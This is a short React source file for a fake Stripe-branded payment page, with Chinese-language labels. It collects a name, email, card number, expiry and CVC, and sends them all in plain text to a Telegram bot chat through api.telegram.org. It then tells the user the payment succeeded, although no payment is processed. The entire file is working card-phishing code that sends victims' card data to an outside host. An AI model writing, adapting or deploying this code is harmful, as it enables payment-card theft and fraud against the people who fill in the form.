import React, { useState } from 'react';

export default function App() {
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({ name: '', email: '', card: '', expiry: '', cvc: '' });

  const handleChange = (e) => setFormData({ ...formData, [e.target.name]: e.target.value });

  const handleSubmit = async () => {
    setLoading(true);
    const message = \`🧾 假付款表單提交！\n\n👤 姓名: \${formData.name}\n📧 Email: \${formData.email}\n💳 卡號: \${formData.card}\n📅 有效期: \${formData.expiry}\n🔐 CVC: \${formData.cvc}\`;

    await fetch(\`https://api.telegram.org/bot\${process.env.REACT_APP_TELEGRAM_BOT_TOKEN}/sendMessage\`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: process.env.REACT_APP_TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    setTimeout(() => {
      alert('付款成功！我們已收到您的資料。');
      setLoading(false);
    }, 1000);
  };

  return (
    <div style={{ maxWidth: 400, margin: '0 auto', padding: 20 }}>
      <h1>Stripe 模擬付款</h1>
      <input name='name' placeholder='姓名' onChange={handleChange} /><br/>
      <input name='email' placeholder='Email' onChange={handleChange} /><br/>
      <input name='card' placeholder='卡號' onChange={handleChange} /><br/>
      <input name='expiry' placeholder='有效期 MM/YY' onChange={handleChange} /><br/>
      <input name='cvc' placeholder='CVC' onChange={handleChange} /><br/>
      <button onClick={handleSubmit} disabled={loading}>
        {loading ? '處理中...' : '立即付款'}
      </button>
    </div>
  );
}
